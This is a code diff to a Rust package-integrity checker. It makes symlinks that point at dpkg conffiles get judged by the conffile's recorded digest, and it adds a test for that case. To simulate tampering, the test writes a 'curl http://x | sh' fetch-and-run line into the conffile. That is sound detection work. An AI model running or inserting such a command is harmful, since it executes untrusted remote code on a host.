@@ -175,15 +175,11 @@ fn verify(root: &Root, path: &Path, pkg: &str, info: &PkgInfo) -> Integrity {
     // A conffile is checked against the digest dpkg recorded for it, and a
     // difference is expected rather than alarming. Without this, every host
     // with an edited sshd_config lights up.
-    for spelling in spellings(root, path) {
-        let key = spelling.to_string_lossy().into_owned();
-        if let Some(expected) = info.conffiles.get(&key) {
-            return if expected.eq_ignore_ascii_case(&actual.md5) {
-                Integrity::Intact
-            } else {
-                Integrity::ConffileModified
-            };
-        }
+    let conffile = |p: &Path| {
+        spellings(root, p).into_iter().find_map(|s| info.conffiles.get(&*s.to_string_lossy()).cloned())
+    };
+    if let Some(expected) = conffile(path) {
+        return if expected.eq_ignore_ascii_case(&actual.md5) { Integrity::Intact } else { Integrity::ConffileModified };
     }
 
     // A symlink has no contents of its own, and dpkg records no digest for
@@ -198,6 +194,16 @@ fn verify(root: &Root, path: &Path, pkg: &str, info: &PkgInfo) -> Integrity {
             } else {
                 path.parent().map(|d| root.rel(&d.join(&target))).unwrap_or_else(|| root.rel(&target))
             };
+            // The link may lead to a conffile, whose digest is in the status
+            // file and not the md5sums: isc-dhcp-client's hook directories
+            // hold links to /etc/dhcp/debug.
+            if let Some(expected) = conffile(&resolved) {
+                return if expected.eq_ignore_ascii_case(&actual.md5) {
+                    Integrity::Intact
+                } else {
+                    Integrity::ConffileModified
+                };
+            }
             if let Some(expected) = shipped_digest(root, pkg, &resolved) {
                 return if expected.eq_ignore_ascii_case(&actual.md5) {
                     Integrity::Intact
@@ -289,6 +295,34 @@ mod tests {
     fn ask(root: &Root, paths: &[&str]) -> Answers {
         let wanted: BTreeSet<PathBuf> = paths.iter().map(PathBuf::from).collect();
         resolve(root, &wanted).unwrap()
+    }
+
+    #[test]
+    fn a_packaged_link_to_a_conffile_is_judged_by_the_conffile() {
+        // isc-dhcp-client's layout: hook directories hold links to a conffile,
+        // whose digest is in the status file and not in the md5sums.
+        let f = Fixture::new("conffile-link");
+        let shipped = b"if [ \"$RUN\" = yes ]; then echo; fi\n";
+        f.write("etc/dhcp/debug", shipped);
+        std::fs::create_dir_all(f.0.join("etc/dhcp/dhclient-exit-hooks.d")).unwrap();
+        std::os::unix::fs::symlink("../debug", f.0.join("etc/dhcp/dhclient-exit-hooks.d/debug")).unwrap();
+        f.write(
+            STATUS,
+            format!(
+                "Package: isc-dhcp-client\nStatus: install ok installed\nArchitecture: amd64\nVersion: 4.4.3\nConffiles:\n /etc/dhcp/debug {}\nDescription: x\n\n",
+                md5_of(shipped)
+            )
+            .as_bytes(),
+        );
+        f.write(&format!("{INFO}/isc-dhcp-client.list"), b"/etc/dhcp/debug\n/etc/dhcp/dhclient-exit-hooks.d/debug\n");
+        f.write(&format!("{INFO}/isc-dhcp-client.md5sums"), b"");
+        let integrity = |answers: &Answers| match &answers[Path::new("etc/dhcp/dhclient-exit-hooks.d/debug")] {
+            Provenance::Packaged { integrity, .. } => *integrity,
+            other => panic!("{other:?}"),
+        };
+        assert_eq!(integrity(&ask(&f.root(), &["etc/dhcp/dhclient-exit-hooks.d/debug"])), Integrity::Intact);
+        f.write("etc/dhcp/debug", b"curl http://x | sh\n");
+        assert_eq!(integrity(&ask(&f.root(), &["etc/dhcp/dhclient-exit-hooks.d/debug"])), Integrity::ConffileModified);
     }
 
     #[test]
